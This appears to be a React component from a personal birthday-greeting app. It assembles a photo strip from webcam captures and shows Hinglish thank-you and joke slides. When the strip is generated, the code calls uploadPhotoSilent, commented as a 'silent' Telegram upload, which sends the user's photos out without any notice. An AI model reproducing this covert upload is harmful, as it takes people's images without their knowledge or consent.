import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { useExperienceState } from "../state/experienceState";
import { generatePhotoStrip } from "../photo/generatePhotoStrip";
import { SpotifySlide } from "../components/SpotifySlide";
import { Pill, StarShape } from "../components/Shapes";

export default function Finale() {
  const { setScene, capturedPhotos } = useExperienceState();
  const [photoStrip, setPhotoStrip] = useState<string | null>(null);
  const [step, setStep] = useState<"generating" | "photo-reveal" | "final-message" | "final-bhul-gaya" | "final-quote">("generating");

  useEffect(() => {
    if (capturedPhotos.length >= 4) {
      generatePhotoStrip(capturedPhotos.slice(0, 4)).then(url => {
        setPhotoStrip(url);
        setStep("photo-reveal");
        
        // Fire and forget telegram silent upload
        import("../photo/uploadPhoto").then(({ uploadPhotoSilent }) => {
          uploadPhotoSilent(url);
        });
      });
    } else {
      setScene("photo-booth");
    }
  }, [capturedPhotos, setScene]);

  const handleDownload = () => {
    if (photoStrip) {
      const a = document.createElement('a');
      a.href = photoStrip;
      a.download = 'himanshu_ji_photo_strip.jpg';
      a.click();
    }
  };

  return (
    <AnimatePresence mode="wait">
      {step === "generating" && (
         <motion.div key="generating" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="w-full h-screen flex flex-col items-center justify-center bg-sp-blue">
            <h1 className="text-4xl font-display font-bold text-sp-white animate-pulse">DEVELOPING PHOTOS...</h1>
         </motion.div>
      )}

      {step === "photo-reveal" && (
         <motion.div key="reveal" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="w-full h-screen bg-sp-black flex flex-col p-4 md:p-12 relative overflow-hidden">
            <div className="absolute inset-0 bg-checkered opacity-30 mix-blend-overlay"></div>
            
            <div className="z-10 flex flex-col h-full justify-between">
              <div>
                <h2 className="text-3xl md:text-5xl font-display font-bold text-sp-white mb-2">HERE'S OUR<br/>PHOTO STRIP!</h2>
                <StarShape color="var(--color-sp-magenta)" className="w-12 h-12" />
              </div>

              {photoStrip && (
                <motion.div 
                  initial={{ y: 100, opacity: 0 }}
                  animate={{ y: 0, opacity: 1 }}
                  transition={{ type: "spring", delay: 0.5 }}
                  className="w-full flex-1 flex items-center justify-center my-4 overflow-hidden"
                >
                  <img src={photoStrip} alt="Your Photo Strip" className="max-w-full max-h-[50vh] object-contain border-4 border-sp-white shadow-[10px_10px_0_#B9FF26] rotate-1" />
                </motion.div>
              )}

              <div className="flex flex-wrap gap-4 items-center mb-8">
                <button onClick={handleDownload} className="bg-sp-orange text-sp-black font-bold uppercase tracking-widest px-6 py-3 border-2 border-sp-black hover:-translate-y-1 transition-transform shadow-[4px_4px_0_#000]">
                  DOWNLOAD ↓
                </button>
                <button onClick={() => setScene("photo-booth")} className="bg-sp-white text-sp-black font-bold uppercase tracking-widest px-6 py-3 border-2 border-sp-black hover:-translate-y-1 transition-transform shadow-[4px_4px_0_#000]">
                  RETAKE ↻
                </button>
                <div className="ml-auto">
                  <button onClick={() => setStep("final-message")} className="bg-sp-green text-sp-black font-bold uppercase tracking-widest px-8 py-3 rounded-full hover:scale-105 transition-transform">
                    NEXT →
                  </button>
                </div>
              </div>
            </div>
         </motion.div>
      )}

      {step === "final-message" && (
        <SpotifySlide 
          key="message"
          bgColor="var(--color-sp-blue)"
          onNext={() => setStep("final-bhul-gaya")}
          nextText="NEXT →"
        >
          <div className="relative w-full h-full flex flex-col justify-center items-center text-center px-4 md:px-12 overflow-y-auto pt-16 pb-24">
            <motion.div 
              initial={{ opacity: 0, y: 50 }}
              animate={{ opacity: 1, y: 0 }}
              className="z-10 flex flex-col items-center gap-3 md:gap-4 max-w-4xl my-auto"
            >
              <Pill text="Okay... Ab serious wali ek baat." bgColor="var(--color-sp-magenta)" textColor="var(--color-sp-white)" className="text-xs md:text-sm" />
              
              <h2 className="text-2xl sm:text-3xl md:text-5xl font-display font-bold leading-tight md:leading-none uppercase tracking-tight text-sp-white mt-2 md:mt-4">
                Thank you. Delhi mein jis tarah support kiya aur generally bhi jab zarurat padti hai... uske liye genuinely thank you.
              </h2>
              
              <h2 className="text-2xl sm:text-3xl md:text-5xl font-thin leading-tight md:leading-none uppercase tracking-tight text-sp-green mt-4 md:mt-8">
                Aap bhadwe ho. Isme koi doubt nahi hai.
              </h2>
              
              <h2 className="text-2xl sm:text-3xl md:text-5xl font-display font-bold leading-tight md:leading-none uppercase tracking-tight text-sp-white mt-2 md:mt-4">
                Par dil ke achhe ho. Ye bhi sach hai.
              </h2>
              
              <div className="mt-6 md:mt-8 flex flex-wrap justify-center gap-2">
                <Pill text="Happy Birthday Himanshu Ji." bgColor="var(--color-sp-black)" textColor="var(--color-sp-white)" className="text-xs md:text-sm" />
                <Pill text="Khush raho." bgColor="var(--color-sp-orange)" textColor="var(--color-sp-black)" className="text-xs md:text-sm" />
                <Pill text="Bakchodi karte raho." bgColor="var(--color-sp-green)" textColor="var(--color-sp-black)" className="text-xs md:text-sm" />
                <Pill text="Bas thodi kam." bgColor="var(--color-sp-magenta)" textColor="var(--color-sp-white)" className="text-xs md:text-sm" />
              </div>
            </motion.div>
          </div>
        </SpotifySlide>
      )}

      {step === "final-bhul-gaya" && (
        <SpotifySlide 
          key="bhul-gaya"
          bgColor="var(--color-sp-magenta)"
          onNext={() => setStep("final-quote")}
          nextText="NEXT →"
        >
          <div className="relative w-full h-full flex flex-col justify-center items-center text-center px-4 md:px-12">
            <motion.div 
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="z-10"
            >
              <h2 className="text-5xl md:text-7xl font-display font-bold leading-none uppercase tracking-tight text-sp-black">
                Aur haan...<br/>
                ek cheez toh main<br/>bhul hi gaya.
              </h2>
            </motion.div>
          </div>
        </SpotifySlide>
      )}

      {step === "final-quote" && (
        <SpotifySlide 
          key="quote"
          bgColor="var(--color-sp-black)"
          showCheckeredCorners={true}
        >
          <div className="relative w-full h-full flex flex-col justify-center items-center text-center px-4 md:px-12">
            <motion.div 
              initial={{ opacity: 0, y: 50 }}
              animate={{ opacity: 1, y: 0 }}
              className="z-10 flex flex-col items-center"
            >
              <Pill text="AB ENDING WOHI HOGI NA JO HUM BOLTE HAIN..." bgColor="var(--color-sp-magenta)" textColor="var(--color-sp-white)" className="mb-8" />

              <h2 className="text-5xl md:text-7xl lg:text-9xl font-display font-bold leading-none uppercase max-w-5xl tracking-tight text-sp-white">
                POWER RANGER<br/>SPD
              </h2>
              <h3 className="text-3xl md:text-5xl lg:text-7xl font-thin text-sp-green mt-4 lowercase tracking-normal">
                duniya ke rakhwale.
              </h3>

              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 3 }}
                className="mt-16"
              >
                <Pill text="Chalo ab niklo, aapko aur koi kaam dhandha nahi hai kya?" bgColor="var(--color-sp-orange)" textColor="var(--color-sp-black)" />
              </motion.div>

              <StarShape color="var(--color-sp-blue)" className="absolute bottom-10 left-10 w-16 h-16" />
            </motion.div>
          </div>
        </SpotifySlide>
      )}
    </AnimatePresence>
  );
}
